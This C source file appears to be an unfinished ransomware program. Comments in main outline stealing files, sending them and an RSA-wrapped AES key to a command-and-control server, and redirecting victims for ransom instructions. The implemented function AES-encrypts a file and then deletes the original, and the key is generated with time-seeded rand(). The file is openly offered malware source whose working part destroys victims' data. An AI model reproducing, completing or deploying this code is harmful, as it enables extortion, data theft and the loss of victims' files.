#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include "aes.h"


void encrypt_file(struct AES_ctx ctx, char file_path[256]);
void generate_random_key(uint8_t *key, size_t key_length);
void generate_random_iv(uint8_t *iv, size_t iv_length);


int main() {
    //Generate AES key and IV
    srand((unsigned int)time(NULL));

    uint8_t key[32];
    generate_random_key(key, sizeof(key));

    uint8_t iv[16];
    generate_random_iv(iv, sizeof(iv));

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);

    //List all the files we want to borrow ;)

    //Send the raw files to C2

    //Encrypt each file with AES
    encrypt_file(ctx, "");

    //Encrypt the AES key with the RSA public key

    //Send the encrypted AES key to C2


    //Redirect to C2's web page for instructions

    return 0;
}

void encrypt_file(struct AES_ctx ctx, char file_path[256]){
    //@file_path accepts both absolute and relative path

    //Open raw file
    FILE *src_fp;
    src_fp = fopen(file_path, "rb");

    //Parse file's path
    char *file_name = strrchr(file_path, '/');
    if (file_name == NULL) {
        file_name = file_path;
    } else {
        file_name++;
    }

    //Create new (encrypted) file
    char end_fpth[256];
    sprintf(end_fpth, "encrypted_%s", file_name);

    FILE *end_fp;
    end_fp = fopen(end_fpth, "ab");

    //Chunk creation
    const size_t buffer_size = 4096;
    unsigned char buffer[buffer_size];

    //Read file's bytes chunk by chunk until the end
    size_t bytes_read;
    while((bytes_read = fread(buffer, 1, buffer_size, src_fp)) > 0){
        //Encrypt current chunk
        AES_CBC_encrypt_buffer(&ctx, buffer, sizeof(buffer));
        //Write current encrypted chunk in the new file
        fwrite(buffer, 1, bytes_read, end_fp);

        //Clear buffer
        memset(buffer, 0, buffer_size);
    }

    //Remove the raw file
    remove(file_path);



    fclose(src_fp);
    fclose(end_fp);
}


void generate_random_key(uint8_t *key, size_t key_length) {
    for (size_t i = 0; i < key_length; ++i) {
        key[i] = (uint8_t)rand();
    }
}

void generate_random_iv(uint8_t *iv, size_t iv_length) {
    for (size_t i = 0; i < iv_length; ++i) {
        iv[i] = (uint8_t)rand();
    }
}
